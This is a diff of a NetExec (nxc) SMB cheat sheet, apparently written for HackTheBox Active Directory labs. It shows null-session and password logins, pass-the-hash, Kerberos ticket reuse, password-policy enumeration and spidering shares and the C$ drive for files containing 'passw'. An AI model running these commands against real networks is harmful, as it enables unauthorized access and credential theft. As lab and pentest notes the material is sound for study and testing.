@@ -26,11 +26,10 @@ nxc smb 172.16.139.3 -u '' -p ''
 nxc smb 172.16.139.3 -u john -p 'lol123!'
 
 #NTLM:
-#NT:
+
 nxc smb dc01.ad.trilocor.local -u 'john' -H 3135834fa2e5dcdc4367de1c9d0784a3
 
-#Full NTLM:
-nxc smb dc01.ad.trilocor.local -u 'john' -H 3135834fa2e5dcdc4367de1c9d0784a3:3135834fa2e5dcdc4367de1c9d0784a3
+nxc smb dc01.ad.trilocor.local -u 'john' -H HASH:HASH
 
 #Kerberos Ticket, requires a valid ticket to be present in klist:
 nxc smb dc.rustykey.htb -k --use-kcache
@@ -72,7 +71,7 @@ nxc smb dc01.mirage.htb -u john -p 'lol123!' --pass-pol
 ### SMB - Spidering SMB Shares:
 ```bash
 #Standard Spider on a selected share using pattern for keyword to search for:
-nxc smb dc01.ad.trilocor.local -u jwegman -p 'Roasty07' --spider 'Department Shares' --content --pattern "passw"
+nxc smb dc01.mirage.htb -u john -p 'lol123!' --spider 'Department Files' --content --pattern "passw"
 
 #Search C Drive for pattern:
 nxc smb dc01.mirage.htb -u john -p 'lol123!' --spider C\$ --pattern txt
